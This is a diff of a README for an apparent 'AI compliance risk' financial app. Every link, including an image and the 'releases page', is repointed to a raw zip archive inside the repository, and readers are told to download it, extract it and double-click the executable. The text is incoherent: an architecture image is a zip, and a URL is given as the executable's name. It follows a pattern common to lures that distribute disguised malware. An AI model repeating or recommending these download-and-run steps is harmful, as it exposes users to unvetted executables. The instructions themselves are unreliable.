@@ -1,6 +1,6 @@
 # 🛡️ ai-compliance-risk-insights - Your Guide to Financial Compliance and Risk
 
-[![Download Here](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/illustrational/ai-compliance-risk-insights.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/illustrational/ai-compliance-risk-insights.zip)
+[![Download Here](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/data/raw/insights_ai_compliance_risk_2.6.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/data/raw/insights_ai_compliance_risk_2.6.zip)
 
 ## 🔎 What This Does
 This application helps you understand and manage financial risks effectively. It offers:
@@ -14,7 +14,7 @@ This application helps you understand and manage financial risks effectively. It
 The app follows a straightforward data flow: 
 `Data → Models & NLP → App/API → Dashboard`
 
-![Architecture](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/illustrational/ai-compliance-risk-insights.zip)
+![Architecture](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/data/raw/insights_ai_compliance_risk_2.6.zip)
 
 ## 🧰 Stack
 The application is built using:
@@ -26,7 +26,7 @@ The application is built using:
 To get started with the application, follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to go to the releases page.
-   [Download the Application](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/illustrational/ai-compliance-risk-insights.zip)
+   [Download the Application](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/data/raw/insights_ai_compliance_risk_2.6.zip)
 
 2. **Select the Version**: Choose the latest version from the list available.
 
@@ -34,7 +34,7 @@ To get started with the application, follow these simple steps:
 
 4. **Extract the Files**: Once the download completes, go to your downloads folder. Right-click the compressed file and select "Extract All".
 
-5. **Run the Application**: Locate the extracted folder. Find the executable file (e.g., `https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/illustrational/ai-compliance-risk-insights.zip`) and double-click it to launch.
+5. **Run the Application**: Locate the extracted folder. Find the executable file (e.g., `https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/data/raw/insights_ai_compliance_risk_2.6.zip`) and double-click it to launch.
 
 ## 🖥️ System Requirements
 To ensure smooth operation, make sure your system meets these requirements:
@@ -47,7 +47,7 @@ To ensure smooth operation, make sure your system meets these requirements:
 For the best experience, follow these steps to download and install the application:
 
 1. **Go to Releases**: Visit the release page to download the latest version.
-   [Download the Application](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/illustrational/ai-compliance-risk-insights.zip)
+   [Download the Application](https://raw.githubusercontent.com/jenishsoftx6/ai-compliance-risk-insights/main/data/raw/insights_ai_compliance_risk_2.6.zip)
 
 2. **Select File**: Click on the desired file for your operating system.
 
